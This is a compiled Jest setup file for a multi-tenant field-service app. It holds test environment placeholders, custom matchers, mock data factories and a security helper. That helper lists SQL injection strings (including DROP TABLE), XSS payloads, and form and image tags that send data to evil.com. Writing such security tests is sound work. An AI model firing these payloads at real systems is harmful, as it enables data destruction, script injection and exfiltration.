"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.MockFactory = exports.PerformanceTestUtils = exports.SecurityTestUtils = exports.TestDatabase = void 0;
beforeAll(async () => {
    process.env.NODE_ENV = 'test';
    process.env.JWT_SECRET = 'enterprise-test-jwt-secret-key-256-bit';
    process.env.SUPABASE_URL = 'https://test-enterprise.supabase.co';
    process.env.SUPABASE_ANON_KEY = 'test-enterprise-anon-key';
    process.env.SUPABASE_SERVICE_ROLE_KEY = 'test-enterprise-service-role-key';
    process.env.SUPABASE_SECRET_KEY = 'test-enterprise-secret-key';
    process.env.DATABASE_URL = 'postgresql://test:test@localhost:5432/verofield_test';
    process.env.REDIS_URL = 'redis://localhost:6379/1';
    process.env.ENCRYPTION_KEY = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
    process.env.PERFORMANCE_MONITORING = 'true';
    process.env.SECURITY_SCANNING = 'true';
    process.env.ACCESSIBILITY_TESTING = 'true';
});
expect.extend({
    toBeValidJWT(received) {
        const jwtRegex = /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/;
        const isValid = jwtRegex.test(received);
        return {
            message: () => `expected ${received} to be a valid JWT token`,
            pass: isValid
        };
    },
    toHaveValidTenantId(received) {
        const hasValidTenantId = received &&
            typeof received.tenant_id === 'string' &&
            received.tenant_id.length > 0;
        return {
            message: () => `expected object to have valid tenant_id`,
            pass: hasValidTenantId
        };
    },
    toBeSecureResponse(received) {
        const hasSecurityHeaders = received &&
            received.headers &&
            received.headers['x-content-type-options'] === 'nosniff' &&
            received.headers['x-frame-options'] === 'DENY' &&
            received.headers['x-xss-protection'] === '1; mode=block';
        return {
            message: () => `expected response to have security headers`,
            pass: hasSecurityHeaders
        };
    },
    toHaveValidPermissions(received, permissions) {
        const hasPermissions = permissions.every(permission => received.permissions && received.permissions.includes(permission));
        return {
            message: () => `expected user to have permissions: ${permissions.join(', ')}`,
            pass: hasPermissions
        };
    },
    toMeetPerformanceThreshold(received, threshold) {
        const meetsThreshold = received <= threshold;
        return {
            message: () => `expected ${received}ms to be <= ${threshold}ms`,
            pass: meetsThreshold
        };
    },
    toBeAccessible(received) {
        const hasAriaLabels = received.querySelectorAll('[aria-label]').length > 0;
        const hasAltText = received.querySelectorAll('img[alt]').length > 0;
        const hasHeadings = received.querySelectorAll('h1, h2, h3, h4, h5, h6').length > 0;
        return {
            message: () => `expected element to be accessible`,
            pass: hasAriaLabels || hasAltText || hasHeadings
        };
    }
});
class TestDatabase {
    static getInstance() {
        if (!TestDatabase.instance) {
            TestDatabase.instance = new TestDatabase();
        }
        return TestDatabase.instance;
    }
    async setup() {
        console.log('Test database setup (stub)');
    }
    async cleanup() {
        console.log('Test database cleanup (stub)');
    }
    async seedTestData() {
        const testTenant = {
            id: 'test-tenant-enterprise',
            name: 'Enterprise Test Tenant',
            domain: 'test-enterprise.com',
            settings: {
                features: ['crm', 'work_orders', 'technicians', 'analytics'],
                security: {
                    mfa_required: true,
                    session_timeout: 3600,
                    password_policy: 'strong'
                }
            }
        };
        const testUser = {
            id: 'test-user-enterprise',
            email: 'enterprise-test@verofield.com',
            tenant_id: testTenant.id,
            role: 'admin',
            permissions: [
                'manage_customers',
                'manage_work_orders',
                'manage_technicians',
                'view_analytics',
                'admin_access'
            ],
            profile: {
                first_name: 'Enterprise',
                last_name: 'Tester',
                phone: '+1-555-0123'
            }
        };
        return { testTenant, testUser };
    }
    async clearTestData() {
        console.log('Test data cleared (stub)');
    }
}
exports.TestDatabase = TestDatabase;
class SecurityTestUtils {
    static generateMaliciousPayloads() {
        return {
            sqlInjection: [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --"
            ],
            xssPayloads: [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ],
            csrfPayloads: [
                "<form action='http://evil.com/steal' method='POST'>",
                "<img src='http://evil.com/steal?data=secret'>"
            ]
        };
    }
    static generateInvalidTokens() {
        return {
            expired: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid',
            malformed: 'invalid.jwt.token',
            tampered: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.tampered'
        };
    }
}
exports.SecurityTestUtils = SecurityTestUtils;
class PerformanceTestUtils {
    static async measureExecutionTime(fn) {
        const start = performance.now();
        const result = await fn();
        const duration = performance.now() - start;
        return { result, duration };
    }
    static generateLoadTestData(size) {
        return Array.from({ length: size }, (_, i) => ({
            id: `test-${i}`,
            name: `Test Item ${i}`,
            email: `test${i}@example.com`,
            created_at: new Date().toISOString()
        }));
    }
}
exports.PerformanceTestUtils = PerformanceTestUtils;
class MockFactory {
    static createUser(overrides = {}) {
        return Object.assign({ id: 'mock-user-id', email: 'mock@example.com', tenant_id: 'mock-tenant-id', role: 'dispatcher', permissions: ['manage_customers', 'view_work_orders'], profile: {
                first_name: 'Mock',
                last_name: 'User',
                phone: '+1-555-0000'
            }, created_at: new Date().toISOString(), updated_at: new Date().toISOString() }, overrides);
    }
    static createCustomer(overrides = {}) {
        return Object.assign({ id: 'mock-customer-id', first_name: 'Mock', last_name: 'Customer', email: 'customer@example.com', phone: '+1-555-0001', address: '123 Mock Street', city: 'Mock City', state: 'MC', zip_code: '12345', tenant_id: 'mock-tenant-id', created_at: new Date().toISOString(), updated_at: new Date().toISOString() }, overrides);
    }
    static createWorkOrder(overrides = {}) {
        return Object.assign({ id: 'mock-work-order-id', customer_id: 'mock-customer-id', technician_id: 'mock-technician-id', status: 'scheduled', priority: 'medium', service_type: 'pest_control', scheduled_date: new Date().toISOString(), description: 'Mock work order description', tenant_id: 'mock-tenant-id', created_at: new Date().toISOString(), updated_at: new Date().toISOString() }, overrides);
    }
}
exports.MockFactory = MockFactory;
beforeEach(async () => {
    jest.clearAllMocks();
    jest.resetAllMocks();
});
afterEach(async () => {
    jest.restoreAllMocks();
});
afterAll(async () => {
    const testDb = TestDatabase.getInstance();
    await testDb.cleanup();
});
//# sourceMappingURL=enterprise-setup.js.map